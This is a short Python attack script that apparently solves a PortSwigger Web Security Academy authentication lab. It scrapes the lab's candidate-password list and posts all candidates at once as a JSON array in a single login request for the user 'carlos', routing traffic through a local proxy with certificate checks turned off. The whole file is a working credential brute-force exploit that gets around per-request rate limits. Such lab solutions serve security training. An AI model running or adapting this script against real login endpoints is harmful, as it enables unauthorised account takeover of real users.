import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import random
import socket
import json
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {'http':'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def scrap_password():
    url = 'https://portswigger.net/web-security/authentication/auth-lab-passwords'
    r = requests.get(url, verify=False, proxies=proxy)
    res = r.text
    soup = BeautifulSoup (res, 'html.parser')
    for word in soup.code.contents:
        word = word.split('\n')
        password_list = word
    return password_list

def generate_random_ip():
  ip_parts = [random.randint(0, 255) for _ in range(4)]
  return socket.inet_ntoa(bytes(ip_parts))


def json_body():
    password_list = scrap_password()
    passwords = password_list

    credentials = []
    for i in range(len(passwords)):
        credentials.append(passwords[i])

    body = {
        'username': 'carlos',
        'password': credentials
            }


    json_body = json.dumps(body)
    return json_body


def admin_cred(url):
    json = json_body()
    print (json)
    r = requests.post(url, data = json, verify=False, proxies=proxy )
    print(r)



def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url> " % sys.argv[0])
        print("[+] Example: %s www.example.com " % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1].strip()
    print("[+] Brute forcing the shit out of the website...")
    admin_cred(url)


if __name__=="__main__":
    main()